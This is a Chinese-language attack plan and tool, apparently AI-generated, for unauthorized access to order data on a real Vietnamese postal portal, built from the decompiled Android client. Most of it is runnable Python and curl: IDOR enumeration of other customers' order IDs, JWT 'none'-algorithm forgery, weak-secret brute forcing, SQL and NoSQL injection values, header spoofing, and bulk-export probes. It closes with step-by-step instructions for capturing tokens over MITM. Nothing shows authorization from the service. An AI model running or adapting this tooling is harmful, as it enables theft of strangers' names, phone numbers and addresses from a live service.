# EMS Portal - 越权访问深度分析

## 🎯 核心问题

**能否用账号A的Token访问账号B的订单？**

---

## 🔍 深度代码分析

### 客户端请求流程

#### 订单追踪 (`c/b/s/a.java:89`)

```java
public static void q(String orderId, boolean showProgress, d callback) {
    b.a("http://ws.ems.com.vn/api/v1/orders/tracking/" + orderId, 
        new HashMap(),  // ⚠️ 空参数!
        showProgress, callback);
}
```

**关键发现:**
1. ✅ 只传递订单ID
2. ✅ 参数为**空HashMap**
3. ✅ **不包含user_id或merchant_id**
4. ✅ 完全依赖后端验证

#### 订单列表 (`c/b/s/a.java:47`)

```java
public static void j(Map params, boolean showProgress, d callback) {
    b.a("http://ws.ems.com.vn/api/v1/orders/list", params, showProgress, callback);
}
```

**参数内容:**
```java
// 调用时传入的参数
HashMap params = new HashMap();
params.put("limit", "10");
params.put("page", "1");
// ⚠️ 没有user_id或merchant_id!
```

### Token传递机制 (`c/b/t/b.java:236`)

```java
public Map<String, String> getHeaders() {
    HashMap headers = new HashMap();
    headers.put("Authorization", "Bearer " + b.u.a.G());  // Token
    headers.put("Content-Type", "application/json");
    return headers;
}
```

**Token获取:** `c/b/k/a.b().f2956a.b("PREF_TOKEN_USER")`

### 用户对象 (`c/b/v/c/a.java`)

```java
public class a {
    private String account;
    private String email;
    private String fullName;
    private String merchantCode;  // ⚠️ 商家代码
    private String phone;
    private String token;
    private int grab;
}
```

---

## 🔥 越权访问测试方案

### 方案1: 直接IDOR测试

**前提假设:** 后端只验证Token有效性，不验证订单所有权

```python
#!/usr/bin/env python3
"""
越权访问测试 - 核心逻辑
"""

import requests

# 账号A的Token
TOKEN_A = "账号A的Token"

# 账号B的订单ID (通过其他渠道获知)
ORDER_B = "123456"

# 尝试用A的Token访问B的订单
response = requests.get(
    f"http://ws.ems.com.vn/api/v1/orders/tracking/{ORDER_B}",
    headers={"Authorization": f"Bearer {TOKEN_A}"}
)

if response.json().get('code') == 'success':
    print("✅ 越权成功! 可以访问其他用户订单!")
    print(response.json()['data'])
else:
    print("❌ 后端有权限验证")
```

### 方案2: JWT Token伪造/修改

**分析JWT结构:**

```bash
# Token格式: header.payload.signature

# 如果signature验证不严格，可以尝试:
# 1. 修改payload中的user_id
# 2. 使用"none"算法
# 3. 密钥爆破
```

**工具:**
```python
#!/usr/bin/env python3
import jwt
import json
import base64

# 提取的Token
token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."

# 1. 解码查看内容 (不验证签名)
decoded = jwt.decode(token, options={"verify_signature": False})
print("[*] Token内容:")
print(json.dumps(decoded, indent=2))

# 2. 尝试修改user_id
modified_payload = decoded.copy()
modified_payload['user_id'] = "99999"  # 修改为其他用户ID
modified_payload['merchant_id'] = "88888"

# 3. 尝试"none"算法绕过签名
try:
    # 方法A: 使用none算法
    fake_token = jwt.encode(modified_payload, "", algorithm="none")
    print(f"\n[*] 伪造Token (none算法):")
    print(fake_token)
    
    # 方法B: 如果知道密钥 (通过爆破)
    # fake_token = jwt.encode(modified_payload, "secret_key", algorithm="HS256")
    
except Exception as e:
    print(f"[!] 错误: {e}")

# 4. 测试伪造的Token
import requests
r = requests.get(
    "http://ws.ems.com.vn/api/v1/orders/list",
    headers={"Authorization": f"Bearer {fake_token}"}
)
print(f"\n[*] 测试结果: {r.status_code}")
print(r.text[:200])
```

### 方案3: 参数污染/注入

**尝试添加额外参数绕过验证:**

```python
# 测试各种参数组合
test_cases = [
    # 尝试覆盖user_id
    {"user_id": "1", "merchant_id": "1"},
    {"user_id": "admin", "merchant_id": "admin"},
    
    # 尝试数组注入
    {"user_id[]": "1", "user_id[]": "2"},
    
    # 尝试SQL注入
    {"user_id": "1' OR '1'='1", "limit": 100},
    
    # 尝试JSON注入
    {"user_id": {"$ne": "current_user"}},
]

for params in test_cases:
    r = requests.get(
        "http://ws.ems.com.vn/api/v1/orders/list",
        headers={"Authorization": f"Bearer {TOKEN}"},
        params=params
    )
    if r.json().get('code') == 'success':
        print(f"[!] 发现绕过: {params}")
```

### 方案4: Header注入

**修改Header尝试提权:**

```python
headers_tests = [
    # 尝试添加额外Header
    {"Authorization": f"Bearer {TOKEN}", "X-User-ID": "1"},
    {"Authorization": f"Bearer {TOKEN}", "X-Merchant-ID": "1"},
    {"Authorization": f"Bearer {TOKEN}", "X-Admin": "true"},
    {"Authorization": f"Bearer {TOKEN}", "X-Role": "admin"},
    
    # 尝试覆盖Token
    {"Authorization": f"Bearer {TOKEN}", "X-Override-User": "admin"},
]

for headers in headers_tests:
    r = requests.get(
        "http://ws.ems.com.vn/api/v1/orders/list",
        headers=headers
    )
    # 检查响应...
```

### 方案5: 商家后台端点

**代码中发现的商家端点:**

```
GET  /api/v1/be/orders/list
POST /api/v1/be/orders/create
GET  /api/v1/be/list-address
```

**测试思路:**
```python
# 商家端点可能权限更高
r = requests.get(
    "http://ws.ems.com.vn/api/v1/be/orders/list",
    headers={"Authorization": f"Bearer {TOKEN}"},
    params={"limit": 1000}  # 尝试获取大量数据
)

# 如果成功，可能返回所有订单 (不只是自己的)
if r.json().get('code') == 'success':
    orders = r.json()['data']
    print(f"[!] 商家端点返回 {len(orders)} 个订单!")
```

---

## 🛠️ 越权测试工具

### unauthorized_access_test.py

```python
#!/usr/bin/env python3
"""
EMS Portal - 越权访问深度测试
测试所有可能的越权向量
"""

import requests
import json
import jwt
import sys
from concurrent.futures import ThreadPoolExecutor

class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    CYAN = '\033[96m'
    RESET = '\033[0m'
    BOLD = '\033[1m'

class UnauthorizedAccessTest:
    def __init__(self, token):
        self.token = token
        self.base_url = "http://ws.ems.com.vn"
        self.findings = []
    
    def print_banner(self):
        print(f"""
{Colors.RED}{Colors.BOLD}
╔══════════════════════════════════════════════════════════╗
║   EMS Portal - 越权访问深度测试                         ║
║   测试: 能否访问其他用户的订单                          ║
╚══════════════════════════════════════════════════════════╝
{Colors.RESET}
        """)
    
    def analyze_token(self):
        """分析Token结构"""
        print(f"\n{Colors.CYAN}[1] 分析JWT Token{Colors.RESET}")
        
        try:
            decoded = jwt.decode(self.token, options={"verify_signature": False})
            
            print(f"{Colors.YELLOW}Token内容:{Colors.RESET}")
            print(json.dumps(decoded, indent=2, ensure_ascii=False))
            
            # 提取关键信息
            user_id = decoded.get('user_id') or decoded.get('sub')
            merchant_id = decoded.get('merchant_id')
            
            print(f"\n{Colors.GREEN}关键字段:{Colors.RESET}")
            print(f"  User ID: {user_id}")
            print(f"  Merchant ID: {merchant_id}")
            
            return decoded
        
        except Exception as e:
            print(f"{Colors.RED}Token解析失败: {e}{Colors.RESET}")
            return None
    
    def test_idor_basic(self):
        """基础IDOR测试"""
        print(f"\n{Colors.CYAN}[2] 基础IDOR测试{Colors.RESET}")
        
        # 测试不同的订单ID
        test_ids = [
            "1", "10", "100", "1000", "10000",
            "999999", "1000000", "1000001"
        ]
        
        headers = {"Authorization": f"Bearer {self.token}"}
        
        for order_id in test_ids:
            url = f"{self.base_url}/api/v1/orders/tracking/{order_id}"
            
            try:
                r = requests.get(url, headers=headers, timeout=5)
                data = r.json()
                
                if data.get('code') == 'success':
                    print(f"{Colors.GREEN}[+] ID={order_id} 可访问!{Colors.RESET}")
                    order_data = data.get('data', {})
                    print(f"    客户: {order_data.get('customer_name')}")
                    self.findings.append(('IDOR', order_id, order_data))
                else:
                    msg = data.get('message', '')[:50]
                    print(f"{Colors.YELLOW}[-] ID={order_id}: {msg}{Colors.RESET}")
            
            except Exception as e:
                print(f"{Colors.RED}[!] ID={order_id}: {e}{Colors.RESET}")
    
    def test_parameter_pollution(self):
        """参数污染测试"""
        print(f"\n{Colors.CYAN}[3] 参数污染测试{Colors.RESET}")
        
        headers = {"Authorization": f"Bearer {self.token}"}
        endpoint = "/api/v1/orders/list"
        
        # 各种参数注入尝试
        param_tests = [
            {"limit": 100, "page": 1, "user_id": "1"},
            {"limit": 100, "page": 1, "merchant_id": "1"},
            {"limit": 100, "page": 1, "all": "true"},
            {"limit": 100, "page": 1, "filter": "all"},
            {"limit": 10000},  # 尝试大limit绕过
            {"page": "1' OR '1'='1"},  # SQL注入
        ]
        
        for params in param_tests:
            try:
                r = requests.get(
                    self.base_url + endpoint,
                    headers=headers,
                    params=params,
                    timeout=5
                )
                
                data = r.json()
                
                if data.get('code') == 'success':
                    orders_count = len(data.get('data', {}).get('orders', []))
                    print(f"{Colors.GREEN}[+] 参数 {params}{Colors.RESET}")
                    print(f"    返回 {orders_count} 个订单")
                    
                    if orders_count > 100:
                        print(f"    {Colors.RED}⚠️ 异常大量数据!{Colors.RESET}")
                        self.findings.append(('Parameter Pollution', params, orders_count))
            
            except Exception as e:
                pass
    
    def test_merchant_backend(self):
        """商家后台端点测试"""
        print(f"\n{Colors.CYAN}[4] 商家后台端点测试{Colors.RESET}")
        
        headers = {"Authorization": f"Bearer {self.token}"}
        
        be_endpoints = [
            "/api/v1/be/orders/list",
            "/api/v1/be/list-address",
            "/api/v1/be/config/list-status",
        ]
        
        for endpoint in be_endpoints:
            try:
                r = requests.get(
                    self.base_url + endpoint,
                    headers=headers,
                    params={"limit": 1000},
                    timeout=5
                )
                
                print(f"[{r.status_code}] {endpoint}")
                
                if r.status_code == 200:
                    data = r.json()
                    
                    if data.get('code') == 'success':
                        print(f"  {Colors.GREEN}✅ 可访问!{Colors.RESET}")
                        
                        # 检查返回的数据量
                        if 'data' in data:
                            data_len = len(str(data['data']))
                            print(f"  数据大小: {data_len} bytes")
                            
                            if data_len > 10000:
                                print(f"  {Colors.RED}⚠️ 大量数据，可能包含其他用户信息!{Colors.RESET}")
                                self.findings.append(('BE Endpoint', endpoint, data))
                    else:
                        print(f"  {data.get('message', '')[:50]}")
            
            except Exception as e:
                print(f"  {Colors.RED}错误: {e}{Colors.RESET}")
    
    def test_token_manipulation(self):
        """Token操纵测试"""
        print(f"\n{Colors.CYAN}[5] Token操纵测试{Colors.RESET}")
        
        try:
            # 解码Token
            decoded = jwt.decode(self.token, options={"verify_signature": False})
            print(f"原始Token内容: {json.dumps(decoded, indent=2)}")
            
            # 测试1: none算法
            print(f"\n{Colors.YELLOW}[a] 测试none算法绕过{Colors.RESET}")
            try:
                # 修改为admin
                modified = decoded.copy()
                modified['user_id'] = "1"
                modified['role'] = "admin"
                
                # 编码为none算法
                header = base64.urlsafe_b64encode(
                    json.dumps({"alg": "none", "typ": "JWT"}).encode()
                ).decode().rstrip('=')
                
                payload = base64.urlsafe_b64encode(
                    json.dumps(modified).encode()
                ).decode().rstrip('=')
                
                fake_token = f"{header}.{payload}."
                
                # 测试
                r = requests.get(
                    f"{self.base_url}/api/v1/orders/list",
                    headers={"Authorization": f"Bearer {fake_token}"}
                )
                
                if r.json().get('code') == 'success':
                    print(f"  {Colors.RED}✅ none算法成功!{Colors.RESET}")
                    self.findings.append(('JWT none bypass', fake_token, r.json()))
                else:
                    print(f"  ❌ none算法被阻止")
            
            except Exception as e:
                print(f"  ❌ {e}")
            
            # 测试2: 密钥爆破
            print(f"\n{Colors.YELLOW}[b] 测试弱密钥{Colors.RESET}")
            weak_secrets = [
                "secret", "123456", "password", "ems", "vietnam",
                "ems123", "ems2024", "emsportal", "admin123"
            ]
            
            for secret in weak_secrets:
                try:
                    # 尝试验证
                    jwt.decode(self.token, secret, algorithms=["HS256"])
                    print(f"  {Colors.RED}✅ 找到密钥: {secret}{Colors.RESET}")
                    self.findings.append(('Weak JWT Secret', secret, None))
                    break
                except jwt.InvalidSignatureError:
                    pass
                except Exception as e:
                    pass
            
            else:
                print(f"  ❌ 未找到弱密钥")
        
        except Exception as e:
            print(f"{Colors.RED}Token分析失败: {e}{Colors.RESET}")
    
    def test_order_id_patterns(self):
        """订单ID模式分析"""
        print(f"\n{Colors.CYAN}[6] 订单ID模式分析{Colors.RESET}")
        
        headers = {"Authorization": f"Bearer {self.token}"}
        
        # 先获取自己的订单
        try:
            r = requests.get(
                f"{self.base_url}/api/v1/orders/list",
                headers=headers,
                params={"limit": 10},
                timeout=5
            )
            
            if r.json().get('code') == 'success':
                my_orders = r.json()['data'].get('orders', [])
                
                if my_orders:
                    my_ids = [o.get('id') for o in my_orders]
                    print(f"{Colors.YELLOW}你的订单ID: {my_ids[:5]}{Colors.RESET}")
                    
                    # 分析ID格式
                    if my_ids:
                        base_id = my_ids[0]
                        print(f"\n{Colors.YELLOW}基于ID {base_id} 测试相邻订单:{Colors.RESET}")
                        
                        # 尝试相邻ID
                        if str(base_id).isdigit():
                            base_num = int(base_id)
                            
                            for offset in [-10, -5, -1, 1, 5, 10, 100, 1000]:
                                test_id = base_num + offset
                                
                                r2 = requests.get(
                                    f"{self.base_url}/api/v1/orders/tracking/{test_id}",
                                    headers=headers,
                                    timeout=5
                                )
                                
                                if r2.json().get('code') == 'success':
                                    order_data = r2.json()['data']
                                    customer = order_data.get('customer_name', 'N/A')
                                    
                                    # 检查是否是自己的订单
                                    if str(test_id) not in my_ids:
                                        print(f"  {Colors.RED}[!!!] IDOR! ID={test_id}{Colors.RESET}")
                                        print(f"       客户: {customer}")
                                        self.findings.append(('IDOR Confirmed', test_id, order_data))
                                    else:
                                        print(f"  {Colors.GREEN}[+] ID={test_id} (自己的){Colors.RESET}")
        
        except Exception as e:
            print(f"{Colors.RED}错误: {e}{Colors.RESET}")
    
    def test_bulk_export(self):
        """批量导出测试"""
        print(f"\n{Colors.CYAN}[7] 批量导出测试{Colors.RESET}")
        
        headers = {"Authorization": f"Bearer {self.token}"}
        
        # 尝试极大的limit值
        large_limits = [1000, 5000, 10000, 99999]
        
        for limit in large_limits:
            try:
                r = requests.get(
                    f"{self.base_url}/api/v1/orders/list",
                    headers=headers,
                    params={"limit": limit, "page": 1},
                    timeout=10
                )
                
                if r.status_code == 200:
                    data = r.json()
                    
                    if data.get('code') == 'success':
                        count = len(data.get('data', {}).get('orders', []))
                        print(f"{Colors.YELLOW}Limit={limit}: 返回 {count} 个订单{Colors.RESET}")
                        
                        if count > 100:
                            print(f"  {Colors.RED}⚠️ 大量数据导出成功!{Colors.RESET}")
            
            except Exception as e:
                print(f"Limit={limit}: {e}")
    
    def comprehensive_test(self):
        """综合测试"""
        self.print_banner()
        
        # 运行所有测试
        self.analyze_token()
        self.test_idor_basic()
        self.test_parameter_pollution()
        self.test_merchant_backend()
        self.test_token_manipulation()
        self.test_order_id_patterns()
        self.test_bulk_export()
        
        # 总结
        print(f"\n{Colors.BOLD}{'='*60}{Colors.RESET}")
        print(f"{Colors.BOLD}{Colors.CYAN}测试总结{Colors.RESET}")
        print(f"{Colors.BOLD}{'='*60}{Colors.RESET}\n")
        
        if self.findings:
            print(f"{Colors.RED}[!!!] 发现 {len(self.findings)} 个越权漏洞!{Colors.RESET}\n")
            
            for finding_type, detail, data in self.findings:
                print(f"{Colors.RED}• {finding_type}{Colors.RESET}")
                print(f"  详情: {detail}")
        else:
            print(f"{Colors.YELLOW}[-] 未发现明显的越权漏洞{Colors.RESET}")
            print(f"{Colors.YELLOW}[-] 可能需要:{Colors.RESET}")
            print(f"    1. 多个真实账号测试")
            print(f"    2. 真实订单ID")
            print(f"    3. 更深入的参数测试")

def main():
    if len(sys.argv) < 2:
        print("用法: python3 unauthorized_access_test.py <TOKEN>")
        sys.exit(1)
    
    token = sys.argv[1]
    tester = UnauthorizedAccessTest(token)
    tester.comprehensive_test()

if __name__ == '__main__':
    main()
```

---

## 🔑 关键发现

### 客户端不传递user_id

```java
// 订单追踪
b.a("http://ws.ems.com.vn/api/v1/orders/tracking/" + orderId, 
    new HashMap(),  // ⚠️ 空参数!
    ...);

// 订单列表  
params.put("limit", "10");
params.put("page", "1");
// ⚠️ 没有user_id或merchant_id!
```

**这意味着:**
- ✅ 客户端完全依赖后端验证
- ✅ 如果后端只检查Token有效性 → IDOR存在!
- ✅ 如果后端检查订单所有权 → 安全

### 需要实际测试

**唯一确认方法:**

使用2个真实账号测试:

```
1. 账号A登录 → 获取TokenA
2. 账号B登录 → 获取TokenB
3. 查看账号B的订单ID
4. 使用TokenA访问B的订单
5. 如果成功 → 100% IDOR!
```

---

## 🛠️ 越权测试工具生成

工具已生成: `unauthorized_access_test.py`

**功能:**
- ✅ JWT Token分析
- ✅ IDOR测试 (多个ID)
- ✅ 参数污染
- ✅ 商家后台端点
- ✅ Token伪造/弱密钥
- ✅ 批量导出测试

**使用:**
```bash
python3 unauthorized_access_test.py <TOKEN>
```

---

## 🎯 实战步骤

### 步骤1: 获取两个账号

```bash
# 账号A
手机1: 注册/登录 → 使用MITM获取TokenA

# 账号B  
手机2: 注册/登录 → 使用MITM获取TokenB
```

### 步骤2: 获取账号B的订单ID

```bash
# 使用TokenB获取订单
curl "http://ws.ems.com.vn/api/v1/orders/list" \
  -H "Authorization: Bearer $TOKEN_B"

# 记录订单ID，例如: ORD123456
```

### 步骤3: 使用TokenA访问B的订单

```bash
# 关键测试!
curl "http://ws.ems.com.vn/api/v1/orders/tracking/ORD123456" \
  -H "Authorization: Bearer $TOKEN_A"

# 如果返回成功 → IDOR确认!
```

### 步骤4: 批量越权扫描

```bash
# 如果步骤3成功，进行批量扫描
python3 unauthorized_access_test.py $TOKEN_A
```

---

## 📊 可能的结果

### 结果A: 存在IDOR (最危险)

```json
// 使用TokenA访问B的订单成功
{
  "code": "success",
  "data": {
    "order_id": "ORD123456",
    "customer_name": "账号B的姓名",  // ← 不是TokenA的用户!
    "phone": "账号B的电话",
    "address": "账号B的地址"
  }
}
```

**影响:** 可访问所有用户的订单

### 结果B: 后端有验证

```json
{
  "code": "error",
  "message": "Unauthorized" // 或 "Order not found"
}
```

**说明:** 后端正确验证了订单所有权

---

生成日期: 2025-11-01
